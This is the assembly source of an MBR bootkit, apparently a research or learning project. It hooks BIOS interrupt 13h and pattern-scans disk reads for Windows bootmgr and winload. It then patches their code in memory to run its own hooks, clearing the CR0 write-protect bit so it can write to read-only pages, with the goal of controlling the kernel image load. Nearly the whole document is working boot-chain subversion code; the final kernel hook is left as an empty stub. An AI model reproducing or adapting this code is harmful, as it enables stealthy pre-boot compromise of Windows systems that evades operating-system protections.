; this code will be loaded in 0x7e00
[bits 16]
CPU x64 
org 00h

; save all regs before execute the origin code
pushad

; allocate 4096 bytes for the interrupt 13h background service
mov si,0413h    ; using "base memory size in KB" of BIOS Data Area (0040h:0013h)
sub [si],word 4  ; 4096 bytes
lodsw  ;  
shl ax,6  ; * 1024 / 16
mov es,ax   ; store segment address
xor di,di   ; offset

; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
mov si,7e00h
mov ecx,Total_End_of_Binary
rep movsb

; backup old int 13h vector
mov eax,[13h * 4]     ; backup IVT vector 13h
mov [es:Forward_Interrupt_13h_Original + 1],eax   ; store the old jump address

; hook int 13h
mov [13h * 4],word Interrupt_13h_Hook  ; new address to jump to on "int 13h" instruction
mov [13h * 4 + 2],es     ; set segment to jump to on int 13h

mov si,Stage_0_Message
add si, 7e00h
call Print_Text
call wait_key
popad

execute_origin_mbr:
; this will execute the origin mbr 
jmp 0000h:7c00h

; prints the text given in si
Print_Text:
 pushad
pushf
mov bx,0007h                                    ; Page Number = 0, Attribute = 07h
mov ah,0Eh                                      ; Function 0Eh: Teletype Output

cs lodsb                                        ; load the first character

Next_Char:
int 10h
cs lodsb                                        ; al = next character
or al,al                                        ; last letter?
jnz Next_Char                                   ; if not print next letter
popf
popad
ret

Stage_0_Message                 db      '^____^  press any key to continue:',13,10, 0
Bootmgr_sign_found_Message                 db      'Bootmgr_sign_found press any key to patch SU module to gain control in protect mode:',13,10, 0
Interrupt_13h_Message          db      'Interrupt_13h call',13,10, 0

Forward_Interrupt_13h_Original:
; jump to the original interrupt 13h handler (segment:offset will be patched dynamically)
jmp word 0000h:0000h

; now our background "service" starts, we get control only by int 13
; the code is now located at the end of memory (most likely 9F400h)
;direct declare string for print will crash because this code wille be relocate.
Interrupt_13h_Hook:
; backup cpu ctx
    pushad
    pushf
    cmp ah,42h                                                                      ; Extended Read?
    jz read_handler
    cmp ah,02h                                                                      ; Read?
    jnz exit_and_call_origin
read_handler:
    mov si,Interrupt_13h_Message
    call Print_Text

; restore cpu ctx
    popf
    popad
    push ax; save the cmd
    ; simulate interrupt instruction
    pushfw
    push cs
    call word Forward_Interrupt_13h_Original
    jc read_fail_handler

    ; read disk ok,   need more handle so save the result
    pushad ; 32
    pushf ; 2

    push ds  ; 2 data segment register will be modified to access this modules data
    push es; 2

    mov di,bx    ; di will store target buffer
    mov bp,sp
    cmp byte [bp+ 38], 02h
    jz Parameters_Normalized
    mov cx,[si+0x2]  ;get sector count
    les di,[si+0x4] ; get buffer
    Parameters_Normalized:
    shl cx,9 ; number of bytes = sector count * 512
    cld

    ; skip scan if bootmgr already patched.
    ;test [cs:Configuration_Bits],byte 00001000b 
    ;jnz bootmgr_already_patched

    ; now scan the read buffer for a signature in bootmgr
    ;   + 8A 46 ?? 98 3D 00 00 75 03 E9 03 00 E9 35 00
    ;     Windows Vista/7 bootmgr at address 06F2h
    ; patch applied: hooking code to call protected mode part
    ;   000205ec:  mov al, byte ptr ss:[bp+0xfff6]  ; 8a46f6    ->    call far 0020:0009f5c4    ; 669ac4f509002000
    ;   000205ef:  cbw                              ; 98        ->    
    ;   000205f0:  cmp ax, 0x0000                   ; 3d0000    ->    
    ;   000205f3:  jnz .+0x0003                     ; 7503      ->      (nop)                   ; 90
    ;   000205f5:  jmp .+0x0003                     ; e90300    ->    jmp .+0x0003              ; e90300
    ;   000205f8:  jmp .+0x0035                     ; e93500    ->    jmp .+0x0035              ; e93500
    Search_Signature_3:
    mov al,8Ah
    repne scasb
    jnz read_ok_handler                                                     ; if not found => exit
    cmp byte [es:di],0x46
    jnz Search_Signature_3
    cmp dword [es:di+2],00003D98h
    jnz Search_Signature_3
    cmp dword [es:di+6],03E90375h
    jnz Search_Signature_3
    cmp dword [es:di+10],0035E900h
    jnz Search_Signature_3

    ; in win7sp1_x32 this will execute twice
    ; but in win8.1_x64 will only execute  once
    ; apply patch:
    ;   + 66 9A ADDRESS 20 90
    Found_Signature_bootmgr:
    or [cs:Configuration_Bits],byte 00001000b 
    dec di
    mov si,Bootmgr_sign_found_Message
    call Print_Text
    call wait_key
    ;jmp read_ok_handler
   ;jmp Remove_Interrupt_13h_Hook
    
    ; do patch work
    mov word [es:di],0x9A66   ; patch something
    xor eax,eax
    mov ax,cs
    shl eax,4
    add eax,Entry_Point_OS_Vista
    mov [es:di+0x2],eax 
    mov word [es:di+0x6],0x20  
    mov byte [es:di+0x8],0x90 

;Remove_Interrupt_13h_Hook:
    ;mov eax,[Forward_Interrupt_13h_Original+1]   ; offset of original int 13h
   ; xor bx,bx
    ;mov ds,bx
  ;  mov [13h * 4],eax               ; restore interrupt 13h vector (reset offset)

bootmgr_already_patched:
read_ok_handler:
pop es   ; restore all register contents as it was before this hook
pop ds
popf
popad
mov ah,0
read_fail_handler:
    add sp, 2 ; pop the cmd
    retf 2

exit_and_call_origin:
    popf
    popad
    jmp Forward_Interrupt_13h_Original

Configuration_Bits    db  00000000b

wait_key:
pushad
pushf
xor ah,ah                                       ; Function 00h: Get Keystroke
int 16h
popf
popad
ret

; protected code start called by bootmgr SU module
[bits 32]
Entry_Point_OS_Vista:
nop
nop
nop
nop
pushad
push es
push ds

; we need to set correct segment register (this is also why this function was far called)
;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
;   gdtr:base=0x0001f000, limit=0x7f
;   idtr:base=0x0001f080, limit=0x7ff
mov eax,0x30   ; set to 30h, Data Segment
mov es,ax
mov ds,ax
; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
mov edi,00400000h   ; OS Loader base
mov ecx,960 * 1024 
call dword Get_Current_EIP_2
Get_Current_EIP_2:
pop esi
add esi,Relocate_Me_Code - Get_Current_EIP_2
call dword Hook_BootMgrExe

pop ds   ; restore them
pop es
popad
retf

FakeImgpLoadPEImage:
; 1. add origin fail branch later, now we assume everything work ok.
; 用 ebp 来定位局部变量
; 2. ebp-0xb8 ptr ptr to image base
; ebp-0x98 len ptr ptr to image size

call  Obfuscation_Function

; edi now in dos header
mov edi,[ebp-0xb8]
; valid dos  
cmp word [edi],'MZ' ; verify dos Signature
jnz Exit_FakeImgpLoadPEImage

add edi,dword [edi+0x3c]
; valid PE 
cmp word [edi],'PE' ; verify PE Signature
jnz Exit_FakeImgpLoadPEImage
cmp word [edi+0x18],020Bh  ; 020Bh, Magic Number (PE64)
jnz Exit_FakeImgpLoadPEImage

mov ecx,[edi+0x50]  ; SizeOfImage
and edi,0FFFFF000h  ; page base address of PE Image
call dword Hook_OslLoadImage

Exit_FakeImgpLoadPEImage:
jmp Obfuscation_Return ; return to Windows

Hook_BootMgrExe:
; Input
;   esi = address of Relocate_Me_Code
;   edi = address of memory to scan
;   ecx = bytes to scan
; Output
; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
push ecx
push edi

; scan bootmgr!bootmgr.exe for _ImgArchPcatLoadBootApplication@28
; _text:0041C016 E8 EB 54 00 00                          call    _ImgArchPcatLoadBootApplication@28 ; ImgArchPcatLoadBootApplication(x,x,x,x,x,x,x)
; _text:0041C01B 8B F0                                   mov     esi, eax
; _text:0041C01D                         ; 110:       if ( v9 < 0 )
; _text:0041C01D 85 F6                                   test    esi, esi
; _text:0041C01F 0F 88 86 01 00 00                       js      loc_41C1AB
; _text:0041C025                         ; 115:       v4 = v30;
; _text:0041C025 83 3D 8C 44 4B 00 00                    cmp     _BdDebugTransitions, 0
; _text:0041C02C 8B 7C 24 1C                             mov     edi, [esp+0D0h+var_B4]
; patch 0041C01B - 0041C01F to
; ff 15 [FakeImgpLoadPEImage] nop  nop nop nop
; 8B F0 85 F6 0F 88 ?? ?? ?? ?? 83 3D ?? ?? ?? ?? ?? 8B

Search_Unknown_Signature:
mov al,0x8B
repne scasb
jnz Hook_BootMgrExe_Exit
cmp dword [edi-0x1],0xF685F08B
jnz Search_Unknown_Signature
cmp word [edi+0x3],0x880F
jnz Search_Unknown_Signature
cmp word [edi+0x9],0x3D83
jnz Search_Unknown_Signature
cmp byte [edi+0x10],0x8B
jnz Search_Unknown_Signature

; backup 10 bytes to overwrite them with custom code
; break in 0x9edf5
dec edi                                                                         ; -1 to get to start of signature

; store new code: FF 15 + address  (call hook)
mov ax,0x15FF  ; FF 15, opcodes of call [address]
stosw          
lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
mov [es:esi],eax ; set the Hook_Address variable
lea eax,[esi]   ; get address of variable address, used for call [address]
stosd 
mov eax, 0x90909090
stosd

Hook_BootMgrExe_Exit:
pop edi
pop ecx
ret


Hook_OslLoadImage:
push ecx
push edi

; gain control after BlImgLoadPEImageEx retrun in OslLoadImage function
;_text:00000000008E159E E8 31 52 03 00                          call    BlImgLoadPEImageEx
;_text:00000000008E15A3 8B F0                                   mov     esi, eax
;_text:00000000008E15A5                         ; 262:   if ( v27 >= 0 )
;_text:00000000008E15A5 85 C0                                   test    eax, eax
;_text:00000000008E15A7 0F 88 F5 01 00 00                       js      loc_8E17A2
;_text:00000000008E15AD                         ; 264:     v7 = vars20;
;_text:00000000008E15AD 48 8B B5 B0 00 00 00                    mov     rsi, [rbp+90h+var_s20]
;  特征码
;  8B F0 85 C0 0F 88 ?? ?? ?? ??  48 8B B5

Search_Osl_Signature:
mov al,0x8B
repne scasb
jnz Hook_OslLoadImage_Exit
cmp dword [edi-0x1],0xc085F08B
jnz Search_Osl_Signature
cmp word [edi+0x3],0x880f
jnz Search_Osl_Signature
cmp word [edi+0x9],0x8b48
jnz Search_Osl_Signature
cmp byte [edi+0xb],0xB5
jnz Search_Osl_Signature
dec edi

; winload_Fail_Ret_Address
; tmp save fail branch
mov eax,[edi + 6]
add eax,edi
add eax,0xa
mov [esi+4], eax

; uncomment next line to give up patch
; jmp Hook_OslLoadImage_Exit

; store new code: FF 15 + address  (call hook)
; mov ax,0x15FF  ; FF 15, opcodes of call [address]
mov al, 0xe8
stosb         
lea eax,[esi - (Relocate_Me_Code - OslFakeImgpLoadPEImage)]   ; get offset of hook code
sub eax,edi
sub eax,4
stosd 
mov eax, 0x90909090
stosd
mov al,0x90
stosb

Hook_OslLoadImage_Exit:
pop edi
pop ecx
ret

Relocate_Me_Code:
Hook_Address    dd  0
winload_Fail_Ret_Address    dd  0
Some_Flag dd 0
ntkernel_Hook_Address    dd  0

Obfuscation_Function:
; [stack + 0] = address to jump to
; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2

; Output:
; esi = pointer to Relocate_Me_Code
; edi = pointer to return code of Windows / Argument 2

; during execution all memory access is possible is cr0.wp cleared
; return by jumping to Obfuscation_Return

;  入栈顺序 EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI
pushad   ; +32
pushfd     ; +4
cld

; clear cr0.Write Protect flag (to allow writing into read-only user pages)
mov eax,cr0
push eax ; +4
and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows

; set parameters and call
mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
call dword Get_Current_EIP_0
Get_Current_EIP_0:
pop esi ; esi = eip
sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
jmp [esp+0x28]   ; jump

; restore cr0.wp
Obfuscation_Return:
pop eax
mov cr0,eax   ; everything done fine, restore it and give control back to Windows

popfd
popad
add esp,4
ret 

[bits 64]
Obfuscation_Function_x64:

;  入栈顺序 EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI
; pusha   ; +64 not avaliable in x64 mode
push rax
push rcx
push rdx
push rbx
sub rsp,8
push rbp
push rsi
push rdi
pushf     ; +8
cld

; clear cr0.Write Protect flag (to allow writing into read-only user pages)
mov rax,cr0
push rax ; +8
and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows

call  qword  Get_Current_EIP_1
Get_Current_EIP_1:
pop rsi ; esi = eip
sub rsi,Get_Current_EIP_1 - Relocate_Me_Code   ; set rsi to Relocate_Me_Code absolute address
jmp [rsp+0x50]   ; jump

Obfuscation_Return_x64:
pop rax
mov cr0,rax   ; everything done fine, restore it and give control back to Windows

popfq
; popaq
pop rdi
pop rsi
pop rbp
add rsp,8
pop rbx
pop rdx
pop rcx
pop rax
add rsp,8
ret

OslFakeImgpLoadPEImage:
; 用 rbp 来定位局部变量
; rbp-0x90 image size
; rbp-0x80 image base
mov     esi, eax
call Obfuscation_Function_x64

; get ret value of OslLoader!BlImgLoadPEImageEx
mov rax,[rsp + 0x48]
test    eax, eax
js jmp_to_fail_branch

; you can do work now
; check a flag bit if we already patch ntoskernel.exe
mov edi, dword  [rsi + 8]
and edi,0x1
jnz Exit_OslFakeImgpLoadPEImage

; rdi now in dos header
mov rdi,[rbp-0x80]
cmp word [rdi],'MZ' ; verify dos Signature
jnz Exit_OslFakeImgpLoadPEImage

mov eax  ,dword [rdi+0x3c]
add rdi, rax
cmp word [rdi],'PE' ; verify PE Signature
jnz Exit_OslFakeImgpLoadPEImage
cmp word [rdi+0x18],020Bh  ; 020Bh, Magic Number (PE64)
jnz Exit_OslFakeImgpLoadPEImage

mov ecx,[rdi+0x50]  ; SizeOfImage
and rdi, 0FFFFFFFFFFFFF000h  ; page base address of PE Image
call  Hook_NtosKerenelImage

Exit_OslFakeImgpLoadPEImage:
jmp Obfuscation_Return_x64

jmp_to_fail_branch:
; change ret addr to error branch
mov eax, [esi+4]
mov [esp+0x58], eax
jmp Obfuscation_Return_x64

Hook_NtosKerenelImage:
push rcx
push rdi

Hook_NtosKerenelImage_Exit:
pop rdi
pop rcx
ret

; data following, [ebp - 32] will point to here
Data_Reference:
Subsystem_Variables:
Ntoskrnl_BaseAddress        dd  0
Callback_NotifyDriverLoad   dd  0
Memory_Pool                 dd  0

Total_End_of_Binary:
times 4*1024-($-$$) db 0